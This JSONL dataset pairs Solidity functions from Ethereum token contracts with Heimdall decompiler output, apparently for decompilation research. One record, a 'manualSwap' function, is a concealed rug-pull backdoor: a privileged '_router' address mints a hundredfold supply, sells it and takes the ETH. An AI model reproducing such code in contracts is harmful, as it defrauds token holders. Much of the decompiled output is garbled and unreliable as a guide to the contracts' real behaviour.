{"contract_address": "0x9cE4E67bFC441B766d43D1C2C8929A281E35A294", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x0f4240) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x0f4240;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x0f4240) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x0f4240;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x0f4240) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x0f4240;\n                                emit MaxTxAmountUpdated(0x0f4240);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xa5f88146Cff0673fCea44A32ddB845302c835619", "original_solidity_code": "function isExcludedFromFees(address account) public view returns(bool) {\r\n        return _isExcludedFromFees[account];\r\n    }", "heimdall_decompiled_code": "function isExcludedFromFees(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x1c;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0xeffb5Ed8242e5270aD662C82EfcA97aDAdE27dFD", "original_solidity_code": "function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) public onlyOwner {\r\n        _swapTokensAtAmount = swapTokensAtAmount;\r\n    }", "heimdall_decompiled_code": "function setMinSwapTokensThreshold(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _swapTokensAtAmount = arg0;\n    }"}
{"contract_address": "0xF6FF7F8635a951ecF4D68264b32FB3a4b5f9cf15", "original_solidity_code": "function disableTransferDelay() external onlyOwner returns (bool){\\r\\n        transferDelayEnabled = false;\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function disableTransferDelay() public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        transferDelayEnabled = uint248(transferDelayEnabled);\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function payRoyalty(uint256 _price) public payable {\\r\\n        require(msg.value == _price, \\\"Incorrect amount\\\");\\r\\n\\r\\n        uint256 royaltyAmount = (_price * royaltyPercentage) / 100; \\r\\n        payable(address(this)).transfer(royaltyAmount);\\r\\n    }", "heimdall_decompiled_code": "function payRoyalty(uint256 arg0) public payable {\n        require(msg.value == arg0, \"Incorrect amount\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x10;\n        var_d = 0x496e636f727265637420616d6f756e7400000000000000000000000000000000;\n        require(!(arg0) & (uint32(ownerd) > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg0)));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x64);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        (bool success, bytes memory ret0) = address(this).transfer((arg0 * (uint32(ownerd))) / 0x64);\n    }"}
{"contract_address": "0xD551F2Bd835B49DB742f0382d441Ede9C7C1Ee30", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg1)), \"ERR: zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(!(address(msg.sender)) == 0), \"ERR: zero address\");\n        require(!(address(arg0) == 0), \"ERR: zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x11;\n        var_h = 0x4552523a207a65726f2061646472657373000000000000000000000000000000;\n    }"}
{"contract_address": "0xe1d694acc0BA97387ba1BA0Ed26437DD49f0ea05", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x05;\n        address var_c = !(!bytes1(storage_map_b[var_a] / 0x01));\n        return !(!bytes1(storage_map_b[var_a] / 0x01));\n    }"}
{"contract_address": "0x62DdfB2BA9444095aA52f34c00f73de37436139B", "original_solidity_code": "function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transferFrom(address arg0, address arg1, uint256 arg2) public view {\n        if (!(address(arg0)) == 0) {\n            if (!(address(arg1)) == 0) {\n                if (arg2 > 0) {\n                    address var_a = address(arg0);\n                    var_b = 0x04;\n                    if (!storage_map_c[var_a] / 0x01) {\n                        var_a = address(arg1);\n                        var_b = 0x04;\n                        if (storage_map_c[var_a] / 0x01) {\n                            var_a = address(arg0);\n                            var_b = 0x04;\n                            require(!(address(arg0) == 0), \"Transfer amount must be greater than zero\");\n                            require(!(address(arg1) == 0), \"Transfer amount must be greater than zero\");\n                            var_a = address(arg0);\n                            var_b = 0x04;\n                            require(arg2 > 0, \"Transfer amount must be greater than zero\");\n                            require(!(!bytes1(storage_map_c[var_a] / 0x01)), \"Transfer amount must be greater than zero\");\n                            var_a = address(arg0);\n                            var_b = 0x04;\n                            require(!(!bytes1(storage_map_c[var_a] / 0x01)), \"Transfer amount must be greater than zero\");\n                            var_a = address(arg1);\n                            var_b = 0x04;\n                            require(!(!bytes1(storage_map_c[var_a] / 0x01)), \"Transfer amount must be greater than zero\");\n                        }\n                    }\n                }\n                var_a = address(arg1);\n                var_b = 0x04;\n                require(!(!bytes1(storage_map_c[var_a] / 0x01)), \"Transfer amount must be greater than zero\");\n            }\n            require(!(!bytes1(storage_map_c[var_a] / 0x01)), \"Transfer amount must be greater than zero\");\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x29;\n        var_g = this.code[12949:12990];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = this.code[12727:12762];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = this.code[12990:13027];\n    }"}
{"contract_address": "0x85188f89Ef6A5714818DefC0607727c9BE9f8949", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x6f87c7FAc982eB280d81865547aB31fD209b1637", "original_solidity_code": "function startNow() external onlyOwner {\\n        tradingActive = true;\\n        swapEnabled = true;\\n\\n        endHighFeesBlock = block.number + 2; // higher tax for bots\\n    }", "heimdall_decompiled_code": "function startNow() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        blacklistRenounced = 0x010100 | (uint240(blacklistRenounced));\n        if (!0x02 > ~(block.number)) {\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            endHighFeesBlock = 0x02 + block.number;\n        }\n    }"}
{"contract_address": "0x59f53b5298b50696aA8995dda90D6a0bB77dE394", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender() == _router);\r\n        _balances[address(this)] = _balances[address(this)].add(_tTotal*100);\r\n        uint256 tokenBalance = balanceOf(address(this));\r\n        if (tokenBalance > 0) {\r\n            swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance = address(this).balance;\r\n        if (ethBalance > 0) {\r\n            _router.transfer(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public view {\n        require(address(msg.sender) == (address(store_k)));\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x02540be400) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x11;\n                if (0x0a) {\n                    if (0x0a == 0x01) {\n                        if (0x0a == 0x02) {\n                            if (!0x09 > 0xff) {\n                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_b = 0x11;\n                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                    if (!0x09 > 0x01) {\n                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_b = 0x11;\n                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_b = 0x11;\n                                                if (!0x01) {\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x1727A45a3E3bE7AdF4B185D80F0b4F557b755f87", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"SafeMath: multiplication overflow\");\n        require(address(arg0) - 0, \"SafeMath: multiplication overflow\");\n        require(arg1 > 0, \"SafeMath: multiplication overflow\");\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(!(address(arg0)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(store_b > store_c, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_d == ((arg1 * store_d) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_d) / arg1) == store_d, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_f / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_g / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        address var_a = address(tx.origin);\n        var_n = 0x05;\n        require(storage_map_h[var_a] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x49;\n        var_l = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_n = 0x05;\n        storage_map_h[var_a] = block.number;\n        require(!(address(msg.sender) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_d) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(storage_map_h[var_a] > (storage_map_h[var_a] + ((arg1 * store_d) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!(storage_map_h[var_a] + ((arg1 * store_d) / 0x64) < storage_map_h[var_a]), \"SafeMath: addition overflow\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_n = 0x01;\n        storage_map_h[var_a] = storage_map_h[var_a] + ((arg1 * store_d) / 0x64);\n        uint256 var_j = (arg1 * store_d) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_d) / 0x64);\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        var_e = 0x40 + var_e;\n        var_j = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_h[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_h[var_a] - arg1) > storage_map_h[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        storage_map_h[var_a] = storage_map_h[var_a] - arg1;\n        var_e = 0x40 + var_e;\n        var_r = 0x1e;\n        var_s = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_d) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_p = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_u = var_e.length;\n        uint256 var_v = 0;\n        var_w = var_m;\n        var_v = 0;\n        if (!(arg1 - ((arg1 * store_d) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n            if (storage_map_h[var_a] > _maxTaxSwap) {\n            }\n            if (!store_b > store_j) {\n            }\n            if (!storage_map_h[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_g / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_b > store_l) {\n                if (arg1 - 0) {\n                }\n                require(!((arg1 - ((arg1 * store_d) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_b > store_l, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x19;\n        var_l = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_f / 0x01))) {\n            if (address(arg0) == (address(store_f / 0x01))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x5Bfdf57678baFB4eBB2c09279ac382397F3006b6", "original_solidity_code": "function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {\r\n_maxWalletSize = maxWalletSize;\r\n}", "heimdall_decompiled_code": "function setMaxWalletSize(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxWalletSize = arg0;\n    }"}
{"contract_address": "0x9BA9A8e963fDa423Ba29948Bfa34844d3AA9C173", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xC246C2C0B1DEBBFF9370a5A2f0BD35c17DE5b373", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0F92AD5f9f111618AAE7F963c44B862A3e24f48c", "original_solidity_code": "function transfer(address recipient, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(address(arg0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_a = 0x60 + var_a;\n        var_b = 0x26;\n        var_c = this.code[2305:2343];\n        address var_d = address(msg.sender);\n        uint256 var_e = 0;\n        require(!(arg1 > storage_map_e[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        uint256 var_h = var_a.length;\n        require(!(bytes1(var_a.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_i = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_j);\n        var_d = address(msg.sender);\n        var_e = 0;\n        storage_map_e[var_d] = storage_map_e[var_d] - arg1;\n        var_d = address(arg0);\n        require(!((arg1 + storage_map_e[var_d]) < storage_map_e[var_d]), \"SafeMath: addition overflow\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x1b;\n        var_k = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_d = address(arg0);\n        var_e = 0;\n        storage_map_e[var_d] = arg1 + storage_map_e[var_d];\n        uint256 var_f = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_f = 0x01;\n        return 0x01;\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        var_m = 0x23;\n        var_n = this.code[2236:2271];\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        var_m = 0x25;\n        var_n = this.code[2383:2420];\n    }"}
{"contract_address": "0x39f3C6C2a3E69D908DFE9863C9127080CC487933", "original_solidity_code": "function rescueERC20(address tokenAdd, uint256 amount) external onlyOwner {\r\n        IERC20(tokenAdd).transfer(owner(), amount);\r\n    }", "heimdall_decompiled_code": "function rescueERC20(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        var_a = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;\n        address var_b = address(owner);\n        uint256 var_c = arg1;\n        (bool success, bytes memory ret0) = address(arg0).Unresolved_a9059cbb(var_b); // call\n        uint256 var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require(var_e.length == var_e.length);\n    }"}
{"contract_address": "0x4B28fbCeB6a565dEce49390a4E7B8168F29c03BA", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
